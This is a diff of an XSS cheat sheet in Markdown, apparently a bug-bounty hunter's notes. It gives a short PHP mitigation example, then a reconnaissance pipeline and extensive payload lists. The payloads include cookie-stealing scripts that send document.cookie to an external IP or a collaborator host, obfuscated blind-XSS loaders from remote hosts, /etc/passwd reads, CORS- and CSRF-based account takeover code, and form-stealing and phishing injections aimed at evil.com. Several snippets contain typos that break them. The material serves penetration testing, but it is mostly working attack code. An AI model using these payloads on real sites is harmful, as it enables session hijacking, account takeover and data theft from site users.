@@ -1,9 +1,6 @@
----
-tags:
-  - web-app-security
----
+# XSS Methodolog,Notes,Reports,Writeups and Mind Map
+
 # **Example For Vulnerable code**
-    
 ```php
     <!DOCTYPE html>
     <html>
@@ -18,195 +15,373 @@ tags:
     </html>
 ```
     
-- **Mitigation code**
+# Mitigation code
     
-    - Use htmlentities() Function
-        
-        ```php
-        <!DOCTYPE html>
-        <html>
-        <body>
-        
-        <?php
-        $txt = '"><script>alert(0)</script>';
-        echo htmlentities("I love $txt!");
-        ?>
-        
-        </body>
-        </html>
-        ```
-        
-    - Examples for htmlentities()
-        
-        ```php
-        <?php
-        $str = "A 'quote' is <b>bold</b>";
-        
-        // Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
-        echo htmlentities($str);
-        
-        // Outputs: A &#039;quote&#039; is &lt;b&gt;bold&lt;/b&gt;
-        echo htmlentities($str, ENT_QUOTES);
-        ?>
-        ```
-        
-- **XSS Exploitation**
-    
-    - Self XSS + CORS = ATO
-        
-        ```bash
-        <https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70>
-        1. Got self XSS ?
-        2. cat corstexturl.txt | CorsMe or cat corstexturl.txt | soru -u | anew |while read host do ; do curl -s — path-as-is — insecure -H “Origin: test.com” “$host” | grep -qs “Access-control-allow-origin: test.com” && echo “$host \\033[0;31m” cors Vulnerable;done
-        3. So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain), with the following code:
-        
-        function cors() {  
-        var xhttp = new XMLHttpRequest();  
-        xhttp.onreadystatechange = function() {    
-            if (this.status == 200) {    
-            alert(this.responseText);     
-            document.getElementById("demo").innerHTML = this.responseText;    
-            }  
-        };  
-        xhttp.open("GET", "<https://www.attacker.com/api/account>", true);  
-        xhttp.withCredentials = true;  
-        xhttp.send();
-        }
-        cors();
-        4. So here is the final POC
-        <https://test.attacker.com/patter.jsp?facct=>"><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","<https://www.attacker.com/api/account>",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
-        ```
-        
-    - Self XSS to ATO
-        
-        ```python
-        ## convert self xss to reflected one
-        copy response in a file.html -> it will work
-        ```
-        
-    - XSS to ATO
-        
-        ```jsx
-        <script>
-        fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>', {
-        method: 'POST',
-        mode: 'no-cors',
-        body:document.cookie
-        });
-        </script>
-        ```
-        
-        ```jsx
-        ## Cookie stealing through xss
-        <https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py>
-        <https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md>
-        <script>var i=newImage;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
-        <img src=x onerror=this.src='<http://172.30.5.46:8888/?'+document.cookie;>>
-        <img src=x onerror="this.src='<http://172.30.5.46:8888/?'+document.cookie>; this.removeAttribute('onerror');">
-        ```
-        
-    - XSS to RCE
-        
-        [https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/](https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/)
-        
-    - XSS to LFI
-        
-        ```jsx
-        <script%00>
-         x=new XMLHttpRequest;
-         x.onload=function(){document.write(this.responseText)};
-         x.open("GET","file:///etc/passwd");x.send();
-         </script%00>
-        
-        <script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
-        
-        <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-        <script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
-        ```
-        
-    - XSS to SSRF
-        
-        ```python
-        <esi:include src="<http://yoursite.com/capture>" />
-        ```
-        
-    - XSS to CSRF
-        
-        - XSS to CSRF [ [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb) ]
-            
-            POC : `[<https://vulnerable.site/profile.php?msg=><](<https://vulnerable.site/profile.php?msg=><script src=’https://attacker.site/attacker/script.js’></script>`
-            
-            ```jsx
-            var csrfProtectedPage ='<https://vulnerable.site/profile.php>'
-            var csrfProtectedForm ='form'
-            //get valid token for current request
-            var html = get(csrfProtectedPage);
-            	document.getElementbyId(csrfProtectedForm);
-            var token = form.token.value;
-            
-            //Build with valid token
-            document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';
-            
-            // Auto submit form
-            document.forms["myfor"].submit();
-            function get(url){
-            var xmlHttp = new XMLHttpRequest();
-            xamlHttp.open("GET", url.false);
-            xmlHttp.send(null)
-            return xmlHttp.responseText;
-            }
-            ```
-            
-        
-        ```python
-        <script>
-        var req = new XMLHttpRequest();
-        req.onload = handleResponse;
-        req.open('get','/my-account',true);
-        req.send();
-        function handleResponse() {
-            var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];
-            var changeReq = new XMLHttpRequest();
-            changeReq.open('post', '/my-account/change-email', true);
-            changeReq.send('csrf='+token+'&email=test@test.com')
-        };
-        </script>
-        ```
-        
-    - XSS to Host Header Injection
-        
-        ```jsx
-        ## host header injection through xss
-        hostheader: bing.com">script>alert(document.domain)</script><"
-        ```
-        
-    - XSS to Open Redirect
-        
-        ```jsx
-        ## URL redirection through xss
-        document.location.href="<http://evil.com>"
-        ```
-        
-    - Phishing Via Iframe
-        
-        ```jsx
-        ## phishing through xss - iframe injection
-        <iframe src="<http://evil.com>" height="100" width="100"></iframe>
-        ```
-        
-    - **Remote File Inclusion (RFI) to XSS**
-        
-        ```jsx
-        php?=http://brutelogic.com.br/poc.svg
-        ```
-        
-    - **File upload To XSS**
-        
-        ```jsx
-        ## file upload  through XSS
-        upload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
-        ```
-        
+- Use htmlentities() Function
+	
+	```php
+	<!DOCTYPE html>
+	<html>
+	<body>
+	
+	<?php
+	$txt = '"><script>alert(0)</script>';
+	echo htmlentities("I love $txt!");
+	?>
+	
+	</body>
+	</html>
+	```
+	
+- Examples for htmlentities()
+	
+	```php
+	<?php
+	$str = "A 'quote' is <b>bold</b>";
+	
+	// Outputs: A 'quote' is &lt;b&gt;bold&lt;/b&gt;
+	echo htmlentities($str);
+	
+	// Outputs: A &#039;quote&#039; is &lt;b&gt;bold&lt;/b&gt;
+	echo htmlentities($str, ENT_QUOTES);
+	?>
+	```
+	
+
+# XSS & HTMLI Testing Methodology 
+### [XSS Payload Schema](https://brutelogic.com.br/blog/xss-payload-scheme/)
+
+- Basic Schema
+	`<tag handler=code>`
+- Advanced Final Schema 
+	Try to make you Payloads inspired by this schema this will help you to bypass filters/Bypasses
+	`extra1<tag spacer1 extra2 spacer2 handler spacer3 = spacer4 code spacer5> extra3`
+- [Filter Bypass Procedure](https://brutelogic.com.br/blog/filter-bypass-procedure/)
+```python
+#XSS vs WAF 
+1) use <x & jump to event handler 
+2) use onxxx=yyy & find number of x it accepts 
+3) test them & change tag accordingly 
+4) put js
+```
+### 1) Find a reflection point
+- use gau/waymore to grab all urls and pass them to kxss tool to test reflection
+	`echo "domain.com" | gau | kxss | grep ">"`
+- Do some Google or any seach engines dorking to find endpoints
+	```python
+	ext:php | ext:asp | ext:aspx | ext:jsp | ext:asp | ext:pl | ext:cfm | ext:py | ext:rb | ext:.html
+	```
+- Navigate to website and try every single function and features with burp/ZAP logging the requests Testing every parameter for relection using Extenstions like "Reflector" or "Reflect" 
+  - FUZZING parameters using "Param-Miner" and "Arjun and test their reflection
+
+### 2) Get HTML injection
+- Payloads
+```html
+88<h1>POC for h0tak88r</h1>88  
+%253Ch1%253EHTML%253C%252Fh1%253E  
+<iframe id="if1" src="https://www.google.com"></iframe>  
+&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;  
+&#60;h1&#62;HTML&#60;/h1&#62;  
+---------  
+<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>  
+------------------  
+<h1>!!</h1><br/><h2><p style=\"color:red;\">there is a new discount code of 80%. Take advantage of it now!</p><form action=\"https://url/\"><button type=\"submit\">Click Here</button></h2>
+```
+#### [HTML Injection Exploitation/Escalation](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
+- Open Redirect
+	```html
+	<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
+	<meta http-equiv="refresh" content="0; url=http://h0tak88r.github.io" />
+	```
+- Setting a Cookie
+	```html
+	<meta http-equiv="Set-Cookie" Content="SESSID=1">
+	```
+- [Portal Tag](https://research.securitum.com/security-analysis-of-portal-element/)
+	```html
+	<portal src='https://attacker-server?
+	```
+- [PasteJacking Attack](https://freedium.cfd/https://corneacristian.medium.com/methods-to-exploit-html-injection-17b4254035e)
+	```html
+	<html>  
+	   <body>  
+	      <span style="display: block; float: left;">Copy me<br> </span>  
+	      <span style="display: block; float: left; background: transparent; color: transparent; white-space: no-wrap; overflow: hidden; width: 0px; height: 0px;"> ; *Your Command/Payload Here* </span>  
+	      <span style="display: block; float: left;">    
+	</span>  
+	      <span style="display: block; white-space: no-wrap;"> </span>  
+	      <span style="display: block; clear: both;"></span>  
+	    </body>  
+	</html>
+	```
+- [Defacement](https://medium.com/@lamscun/how-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe)
+- [HTML Injection to SSRF](https://faizannehal.medium.com/how-you-can-escalate-a-simple-html-injection-into-a-critical-ssrf-8cd754e1a114)
+    `<iframe src=https://yourwebsite.com/redirect.php?link=file:///etc/passwd></iframe>`
+- Stealing clear text secrets
+	```html
+	<img src='http://attacker.com/log.php?HTML= <meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text= <meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
+	// Abuse CSS
+	<style>@import//hackvertor.co.uk?
+	<table background='//your-collaborator-id.burpcollaborator.net?'
+	```
+- stealing forms    
+	- Set a form header: `<form action='http://evil.com/log_steal'>` this will overwrite the next form header and all the data from the form will be sent to the attacker
+	```html
+	<button name=xss type=submit formaction='https://google.com'>I get consumed!
+	<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
+	```
+	- using noscript
+	```html
+	<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+	```
+	
+### 3) Get your event handler injected
+- [Agnostic Event Handlers](https://brutelogic.com.br/blog/agnostic-event-handlers/)
+	```html
+	<brute contenteditable onblur=alert(1)>lose focus!  
+	<brute onclick=alert(1)>click this!  
+	<brute oncopy=alert(1)>copy this!  
+	<brute oncontextmenu=alert(1)>right click this!  
+	<brute oncut=alert(1)>copy this!  
+	<brute ondblclick=alert(1)>double click this!  
+	<brute ondrag=alert(1)>drag this!  
+	<brute contenteditable onfocus=alert(1)>focus this!  
+	<brute contenteditable oninput=alert(1)>input here!  
+	<brute contenteditable onkeydown=alert(1)>press any key!  
+	<brute contenteditable onkeypress=alert(1)>press any key!  
+	<brute contenteditable onkeyup=alert(1)>press any key!  
+	<brute onmousedown=alert(1)>click this!  
+	<brute onmousemove=alert(1)>hover this!  
+	<brute onmouseout=alert(1)>hover this!  
+	<brute onmouseover=alert(1)>hover this!  
+	<brute onmouseup=alert(1)>click this!  
+	<brute contenteditable onpaste=alert(1)>paste here!  
+	<brute style=font-size:500px onmouseover=alert(1)>0000
+	```
+- [Port Swigger Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- Didn't Work ? -> [XSS Without Event Handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/)
+```html
+# **href**  
+<a href=javascript:alert(1)>click  
+<math><brute href=javascript:alert(1)>click  
+----------------------------------------  
+# **Action**  
+<form action=javascript:alert(1)><input type=submit>  
+<isindex action=javascript:alert(1) type=submit value=click>  
+-----------------------  
+# **formaction**
+**<form><button formaction=javascript:alert(1)>click  
+<form><input formaction=javascript:alert(1) type=submit value=click>  
+<form><input formaction=javascript:alert(1) type=image value=click>  
+<form><input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg>  
+<isindex formaction=javascript:alert(1) type=submit value=click>  
+---------------------------  
+# **data**
+**<object data=javascript:alert(1)>  
+---------------------------------------------  
+# **srcdoc**
+<iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>  
+----------------------------------------------------  
+# **xlink:href**
+<svg><script xlink:href=data:,alert(1)></script>  
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click  
+-------------------------------------------------  
+# **from**
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
+-------------------------------------------------
+```
+
+### 4) Inject JS code
+- h0tak88r XSS
+	```html
+	 "'-->aaaaa<h1 onclick=alert(1)>h0tak88r
+	"'--><h1 onmouseover="alert(88)" style="color: red;">h0tak88r</h1> 
+	"'--><input/onauxclick="[1].map(prompt)">
+	'"()&%<zzz><ScRiPt >alert('88')</ScRiPt>&
+	<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
+	'"--><Body onbeforescriptexecute="[1].map(confirm)">
+	''"--><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
+	'`><\x00img src=xxx:x onerror=javascript:alert(1)> 
+	"><button popovertarget=x>Click me</button> <input type="hidden" value="y" popover id=x onbeforetoggle=alert(document.cookie)>
+	script><svg/onload=prompt`{document.cookie}`>
+	```
+- Blind XSS (Note: Change it to Yours)
+	```html
+	"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
+	'"><script src=//xss.report/s/M8SZT8></script>
+    "><script src="https://js.rip/l5j9hbki0b"></script>
+    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2w1ajloYmtpMGIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+	```
+
+# XSS Exploitation
+	
+- Self XSS + CORS = ATO
+	```bash
+		<https://notifybugme.medium.com/chaining-cors-by-reflected-xss-to-account-takeover-my-first-blog-5b4f12b43c70>
+		1. Got self XSS ?
+		2. cat corstexturl.txt | CorsMe or cat corstexturl.txt | soru -u | anew |while read host do ; do curl -s — path-as-is — insecure -H “Origin: test.com” “$host” | grep -qs “Access-control-allow-origin: test.com” && echo “$host \\033[0;31m” cors Vulnerable;done
+		3. So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain), with the following code:
+		
+		function cors() {  
+		var xhttp = new XMLHttpRequest();  
+		xhttp.onreadystatechange = function() {    
+			if (this.status == 200) {    
+			alert(this.responseText);     
+			document.getElementById("demo").innerHTML = this.responseText;    
+			}  
+		};  
+		xhttp.open("GET", "<https://www.attacker.com/api/account>", true);  
+		xhttp.withCredentials = true;  
+		xhttp.send();
+		}
+		cors();
+		4. So here is the final POC
+		<https://test.attacker.com/patter.jsp?facct=>"><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","<https://www.attacker.com/api/account>",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
+	```
+	
+- Self XSS to ATO
+	
+	```python
+	## convert self xss to reflected one
+	copy response in a file.html -> it will work
+	```
+	
+- XSS to ATO
+	
+	```jsx
+	<script>
+	fetch('<https://BURP-COLLABORATOR-SUBDOMAIN>', {
+	method: 'POST',
+	mode: 'no-cors',
+	body:document.cookie
+	});
+	</script>
+	```
+	
+	```jsx
+	## Cookie stealing through xss
+	<https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py>
+	<https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md>
+	<script>var i=newImage;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
+	<img src=x onerror=this.src='<http://172.30.5.46:8888/?'+document.cookie;>>
+	<img src=x onerror="this.src='<http://172.30.5.46:8888/?'+document.cookie>; this.removeAttribute('onerror');">
+	```
+	
+- XSS to RCE
+	
+	[https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/](https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/)
+	
+- XSS to LFI
+	
+	```jsx
+	<script%00>
+	 x=new XMLHttpRequest;
+	 x.onload=function(){document.write(this.responseText)};
+	 x.open("GET","file:///etc/passwd");x.send();
+	 </script%00>
+	
+	<script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
+	
+	<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+	<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+	```
+	
+- XSS to SSRF
+	
+	```python
+	<esi:include src="<http://yoursite.com/capture>" />
+	```
+	
+- XSS to CSRF
+	
+	- XSS to CSRF [ [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb) ]
+		
+		POC : `[<https://vulnerable.site/profile.php?msg=><](<https://vulnerable.site/profile.php?msg=><script src=’https://attacker.site/attacker/script.js’></script>`
+		
+		```jsx
+		var csrfProtectedPage ='<https://vulnerable.site/profile.php>'
+		var csrfProtectedForm ='form'
+		//get valid token for current request
+		var html = get(csrfProtectedPage);
+			document.getElementbyId(csrfProtectedForm);
+		var token = form.token.value;
+		
+		//Build with valid token
+		document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';
+		
+		// Auto submit form
+		document.forms["myfor"].submit();
+		function get(url){
+		var xmlHttp = new XMLHttpRequest();
+		xamlHttp.open("GET", url.false);
+		xmlHttp.send(null)
+		return xmlHttp.responseText;
+		}
+		```
+		
+	
+	```python
+	<script>
+	var req = new XMLHttpRequest();
+	req.onload = handleResponse;
+	req.open('get','/my-account',true);
+	req.send();
+	function handleResponse() {
+		var token = this.responseText.match(/name="csrf" value="(\\w+)"/)[1];
+		var changeReq = new XMLHttpRequest();
+		changeReq.open('post', '/my-account/change-email', true);
+		changeReq.send('csrf='+token+'&email=test@test.com')
+	};
+	</script>
+	```
+	
+- XSS Via Header Injection
+	
+	```jsx
+	## host header injection through xss
+	hostheader: bing.com">script>alert(document.domain)</script><"
+	```
+	
+- XSS to Open Redirect
+	
+	```jsx
+	## URL redirection through xss
+	document.location.href="<http://evil.com>"
+	```
+	
+- Phishing Via Iframe
+	
+	```jsx
+	## phishing through xss - iframe injection
+	<iframe src="<http://evil.com>" height="100" width="100"></iframe>
+	```
+	
+- **Remote File Inclusion (RFI) to XSS**
+	
+	```jsx
+	php?=http://brutelogic.com.br/poc.svg
+	```
+	
+- **File upload To XSS**
+	
+	```jsx
+	## file upload  through XSS
+	upload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
+	```
+- **XSS via SVG file**
+	```html
+	<?xml version="1.0" standalone="no"?>
+	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+	
+	<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+	   <script type="text/javascript">
+	      alert("h0tak88r XSS");
+	   </script>
+	</svg>
+	```
+	
 # Payload list 
 ```html
 # karem bayloads
@@ -452,25 +627,9 @@ test%2Aconsole.log(1337)//’;
 - **[DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)**
 - **[Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)**
 - **[Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)**
-# Stored XSS
-## **Stored XSS via SVG file**
-  
-is an example of a basic SVG file that will show a picture of a `rectang`
-```svg
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
-   <script type="text/javascript">
-      alert("h0tak88r XSS");
-   </script>
-</svg>
-```
 
 
-
-# some bypasses Techniques
+## Some Bypasses Techniques
 - **XSS for `.JSON` endpoint [ bypass (`.html`)and `WAF` ]**
     
     -  `“resource Type” : “silent:nonexitsting”` Function
@@ -514,7 +673,7 @@ is an example of a basic SVG file that will show a picture of a `rectang`
 22. [Stored XSS in my staff name fired in another your internal panel](https://hackerone.com/reports/946053) to Shopify - 316 upvotes, $5000
 23. [DOM XSS on duckduckgo.com search](https://hackerone.com/reports/868934) to DuckDuckGo - 316 upvotes, $0
 
-## Cross Site Scripting (XSS) Write_ups
+# Cross Site Scripting (XSS) Write_ups
 
 - [From P5 to P2 to 100 BXSS](https://medium.com/@mohameddaher/from-p5-to-p5-to-p2-from-nothing-to-1000-bxss-4dd26bc30a82)
 - [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)
@@ -534,3 +693,6 @@ is an example of a basic SVG file that will show a picture of a `rectang`
 - [Exploiting websocket application wide XSS](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
 - [Reflected XSS with HTTP Smuggling](https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/)
 - [XSS on Facebook instagram CDN server bypassing signature protection](https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/)
+
+# [Mind Map](https://xmind.ai/CTAMcPfH) 
+<iframe src="https://xmind.ai/embed/CTAMcPfH?sheet-id=b6a2b210-e0a2-4ce9-a062-bc4387716f33" width="900px" height="540px" frameborder="0" scrolling="no" allow="fullscreen"></iframe>
